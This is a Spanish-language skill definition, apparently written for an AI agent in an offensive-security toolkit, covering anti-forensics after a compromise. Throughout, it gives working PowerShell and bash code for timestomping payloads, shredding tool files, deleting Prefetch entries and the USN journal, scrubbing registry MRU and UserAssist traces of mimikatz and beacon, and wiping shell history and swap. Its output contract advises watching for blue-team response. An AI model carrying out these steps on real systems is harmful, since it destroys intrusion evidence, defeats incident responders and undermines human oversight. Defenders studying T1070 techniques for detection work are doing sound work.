---
name: evasion-anti-forensics
description: Técnicas anti-forense — timestomping, shredding, metadata removal, Prefetch/USN/Registry cleanup, Linux history y swap wiping.
phase: post
---

# Evasion — Anti-Forensics

## Activation Contract

**Trigger**: El usuario pide eliminar rastros forenses, timestomping de archivos, shredding, limpiar Prefetch/USN Journal, manipular Registry artifacts, o anti-forense en Linux.

**Preconditions**:
- Privilegios de administrador/root para operaciones sensibles (USN journal, Registry).
- Identificar qué archivos o artefactos contienen rastros de actividad.
- Línea de tiempo de la operación (qué timestamps modificar).

**Postconditions**:
- Artefactos forenses eliminados o alterados.
- Línea de tiempo de actividad comprometida.
- Salida JSON con operaciones realizadas.

---

## Hard Rules

1. **No borrar todos los artefactos** — un sistema sin artefactos es más sospechoso que uno con algunos rastros.
2. **Timestomping coherente**: no poner fechas futuras o inconsistentes.
3. **Backup de artefactos antes de modificarlos** si hay acuerdo de preservar evidencia.
4. **En entornos corporativos, el USN Journal es monitoreado** — alterarlo genera alertas inmediatas.

---

## Decision Gates

| Pregunta | Opciones |
|----------|----------|
| Técnica anti-forense | `Timestomping`, `Shredding`, `Metadata removal`, `Prefetch cleanup`, `USN manipulation`, `Registry cleanup`, `Linux artifacts` |
| Alcance | `Archivos propios`, `Todos los archivos del directorio`, `Sistema completo` |
| Coherencia temporal | `Misma fecha que archivos legítimos cercanos`, `Fecha específica`, `Fecha actual` |
| Confirmar operación destructiva | `Yes - aplicar`, `No - solo simular/reportar` |

---

## Execution Steps

### 1. Timestomping (Windows)

```powershell
# Cambiar timestamps de archivos usando SetFileTime via P/Invoke
$timestompCode = @'
using System;
using System.Runtime.InteropServices;
public class Timestomper {
    [DllImport("kernel32.dll")] public static extern bool SetFileTime(
        IntPtr hFile, ref long lpCreationTime, ref long lpLastAccessTime, ref long lpLastWriteTime);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateFile(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes,
        uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    public static void Stamp(string file, DateTime newTime) {
        long ft = newTime.ToFileTime();
        var h = CreateFile(file, 0x100, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
        SetFileTime(h, ref ft, ref ft, ref ft);
        CloseHandle(h);
    }
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);
}
'@
Add-Type $timestompCode

# Aplicar timestamp de un archivo legítimo
$refTime = (Get-Item "C:\Windows\System32\notepad.exe").LastWriteTime
[Timestomper]::Stamp("C:\Users\Public\payload.dll", $refTime)

# O usar herramienta externa (timestomp.exe)
# timestomp.exe payload.dll -e "01/15/2024 12:00:00"
```

### 2. Timestomping (Linux)

```bash
# Cambiar timestamps con touch
touch -t 202401151200.00 payload.so
touch -a -t 202401151200.00 payload.so  # access time
touch -m -t 202401151200.00 payload.so  # modify time

# Usar referencia de un archivo legítimo
touch -r /bin/ls payload.so

# Cambiar timestamps a nivel de inodo (más profundo)
# Usar debugfs para manipular el filesystem directamente (requiere root y disco desmontado)
# debugfs -w /dev/sda1 -R "set_inode_field /path/file crtime 20240115120000"
```

### 3. Shredding de Archivos Sensibles

```powershell
# Windows: cipher /w sobrescribe espacio libre
cipher /w:C:\Users\Public\Tools\

# Alternativa con SDelete de Sysinternals (requiere descarga)
# sdelete.exe -p 3 C:\Users\Public\payload.dll

# O borrado seguro con overwrite manual
$file = "C:\Users\Public\payload.dll"
$size = (Get-Item $file).Length
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$buffer = New-Object byte[] 4096
$stream = [IO.File]::OpenWrite($file)
for ($i = 0; $i -le $size / 4096; $i++) {
    $rng.GetBytes($buffer)
    $stream.Write($buffer, 0, [Math]::Min(4096, $size - $i * 4096))
}
$stream.Close()
Remove-Item $file -Force
```

```bash
# Linux: shred
shred -f -z -u payload.so  # overwrite + zero + delete
shred -n 5 -f -z -u payload.so  # 5 pasadas

# Alternativa: wipe
wipe -rf payload.so

# Borrado seguro con dd
dd if=/dev/urandom of=payload.so bs=4096 count=$(stat -c%s payload.so)/4096 2>/dev/null
rm payload.so
```

### 4. Metadata Removal

```powershell
# Windows: remover metadata de archivos
# Property Store Cleaner (Windows Property System)
$shell = New-Object -ComObject Shell.Application
$folder = $shell.Namespace("C:\Users\Public")
$file = $folder.ParseName("payload.dll")

# Enumerar propiedades y limpiar
for ($i = 0; $i -le 300; $i++) {
    $prop = $folder.GetDetailsOf($null, $i)
    if ($prop) {
        try { $file.ExtendedProperty("$prop") = $null } catch {}
    }
}

# Alternativa con exiftool en Windows
# exiftool -all= payload.dll   # eliminar toda metadata
```

```bash
# Linux: metadata de archivos
touch payload.so  # resetea timestamps a actual
chattr -ia payload.so 2>/dev/null  # remover atributos inmutables

# Para scripts: eliminar shebang lines y comentarios
sed -i '1d' script.sh  # remover shebang

# exiftool para archivos con EXIF
exiftool -all= payload.jpg
```

### 5. Prefetch Cleaning (Windows)

```powershell
# Prefetch contiene rastros de ejecución de archivos
# Ruta: C:\Windows\Prefetch\*.pf
# Los archivos .pf contienen path completo, hash, count de ejecución

# Listar prefetch relevante
$payloadName = "payload"
Get-ChildItem C:\Windows\Prefetch\*.pf | Where-Object { $_.Name -like "*$payloadName*" }

# Borrar entradas de nuestro payload
$prefetchFiles = Get-ChildItem C:\Windows\Prefetch\*.pf | Where-Object {
    $_.Name -match "PAYLOAD|BEACON|MIMIKATZ|PAYLOAD"
}
foreach ($f in $prefetchFiles) {
    # No borrar directamente (sospechoso), sobrescribir con shred
    shred -f -z -u $f.FullName  # usando WSL o herramienta externa
}

# O borrado simple (menos seguro forensically)
Remove-Item C:\Windows\Prefetch\PAYLOAD*.pf -Force -ErrorAction SilentlyContinue

# Nota: deshabilitar Prefetching completamente
# reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
```

### 6. USN Journal Manipulation (Windows)

```powershell
# USN Journal registra TODOS los cambios en el volumen
# $MFT y $UsnJrnl contienen rastros indelebles

# Deshabilitar USN Journal (requiere admin, genera alerta inmediata)
fsutil usn queryjournal C:
fsutil usn deletejournal /D C:

# Alternativa: no recomendado a menos que sea extrema necesidad
# En la práctica, el USN Journal no se puede limpiar selectivamente
# sin herramientas kernel-mode o desmontar el volumen

# Recomendación: no modificar USN Journal, es la alerta más ruidosa
```

### 7. Registry Artifact Cleanup (Windows)

```powershell
# MRU (Most Recently Used) - rastros de archivos abiertos
$mruPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDl",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
)

foreach ($path in $mruPaths) {
    if (Test-Path $path) {
        $items = Get-ItemProperty $path
        # Eliminar entradas específicas que contengan nuestra herramienta
        $items.PSObject.Properties | Where-Object {
            $_.Value -match "payload|mimikatz|beacon"
        } | ForEach-Object { Remove-ItemProperty -Path $path -Name $_.Name }
    }
}

# UserAssist - rastros de ejecución de programas
# Ruta: HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count
$userAssist = Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
foreach ($guid in $userAssist) {
    $countPath = Join-Path $guid.PSPath "Count"
    if (Test-Path $countPath) {
        Get-ItemProperty $countPath | Select-Object *payload* -ErrorAction SilentlyContinue
        # La limpieza de UserAssist requiere decodificar ROT13 + GUID
    }
}

# ShimCache (AppCompatCache) - rastros de ejecución
# HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
# Esta clave solo se puede limpiar con herramientas kernel-mode o borrando el hive
```

### 8. Linux — Shell History y Swap

```bash
# Historial de shell
history -c && history -w
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history 2>/dev/null
unset HISTFILE  # prevenir escritura futura

# Limpiar swap (contiene restos de memoria de procesos)
# Requiere deshabilitar swap temporalmente
swapoff -a
# Sobrescribir swap con zeros
dd if=/dev/zero of=/swap bs=1M 2>/dev/null; rm -f /swap
mkswap /swap 2>/dev/null
swapon -a

# O más seguro: sobrescribir partición swap
# swapoff /dev/sdaX
# dd if=/dev/zero of=/dev/sdaX bs=1M
# mkswap /dev/sdaX
# swapon /dev/sdaX

# Limpiar /tmp y /var/tmp
find /tmp -type f -name "*payload*" -exec shred -f -z -u {} \;
find /var/tmp -type f -name "*payload*" -exec shred -f -z -u {} \;

# Limpiar archivos .swp de vim/nano
find / -name ".*.swp" 2>/dev/null | xargs shred -f -z -u 2>/dev/null
find / -name ".nano_history" -exec shred -f -z -u {} \; 2>/dev/null

# Limpiar /root si se tuvo acceso
if [ "$(whoami)" = "root" ]; then
    cat /dev/null > /root/.bash_history
    cat /dev/null > /root/.viminfo 2>/dev/null
    cat /dev/null > /root/.mysql_history 2>/dev/null
    cat /dev/null > /root/.psql_history 2>/dev/null
    # Scripts temporales
    rm -f /tmp/*.sh /tmp/*.py /tmp/exploit* /root/*.sh
fi
```

### 9. Verificar Limpieza

```bash
# Verificar que no quedan rastros
find / -name "*mimikatz*" -o -name "*payload*" -o -name "*beacon*" 2>/dev/null
strings /dev/mem 2>/dev/null | grep -i "payload\|beacon" | head -5

# En Windows: verificar Prefetch y Registry
# Get-ChildItem C:\Windows\Prefetch\*.pf | Where-Object Name -match "payload"
```

---

## Output Contract

```json
{
  "phase": "post",
  "skill": "evasion-anti-forensics",
  "target": {
    "host": "TARGET-HOST",
    "os": "Windows 10 Pro"
  },
  "operations": [
    {"technique": "timestomping", "target": "payload.dll", "original_time": "2026-07-18T10:30:00", "new_time": "2026-01-15T12:00:00", "reference": "notepad.exe"},
    {"technique": "shredding", "target": "C:\\Users\\Public\\tools\\*.exe", "method": "cipher /w", "passes": 3},
    {"technique": "prefetch_cleanup", "target": "PAYLOAD-*.pf", "files_removed": 2},
    {"technique": "registry_cleanup", "target": "RecentDocs\\payload", "key_count": 3}
  ],
  "overall_status": "Artifacts removed — alert risk: medio (Prefetch ausente)",
  "remaining_artifacts": [
    "USN Journal (no modificado - alerta ruidosa)",
    "ShimCache (requiere kernel-mode)"
  ],
  "recommendation": "Monitorear por 24h si hay respuestas del blue team"
}
```

## Referencias

- MITRE ATT&CK T1070 (Indicator Removal on Host)
- MITRE ATT&CK T1070.004 (Indicator Removal: File Deletion)
- MITRE ATT&CK T1070.006 (Timestomp)
- Windows: SetFileTime API, USN Journal, Prefetch, Registry MRU
- Linux: touch, shred, swapoff, journalctl
